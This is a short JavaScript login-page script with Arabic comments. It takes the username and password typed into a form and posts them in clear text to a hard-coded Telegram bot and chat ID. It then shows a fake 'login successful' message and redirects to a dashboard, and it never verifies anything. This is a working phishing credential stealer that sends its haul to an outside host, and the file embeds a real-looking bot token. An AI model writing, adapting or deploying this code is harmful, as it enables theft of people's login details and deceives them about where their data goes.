const TELEGRAM_BOT_TOKEN = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";  // ضع التوكن هنا
const TELEGRAM_CHAT_ID = "7302541527";  // ضع معرف التليجرام هنا

function sendToTelegram(username, password) {
    const message = `🚀 تسجيل دخول جديد:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ تم إرسال بيانات تسجيل الدخول إلى التليجرام");
        } else {
            console.error("❌ فشل الإرسال:", data);
        }
    })
    .catch(error => console.error("❌ خطأ في الاتصال:", error));
}

function login(event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    if (username.trim() === "" || password.trim() === "") {
        alert("الرجاء إدخال اسم المستخدم وكلمة المرور!");
        return;
    }

    // إرسال البيانات إلى تليجرام
    sendToTelegram(username, password);

    alert("تم تسجيل الدخول بنجاح!");
    window.location.href = "dashboard.html";  // توجيه المستخدم بعد تسجيل الدخول
                }
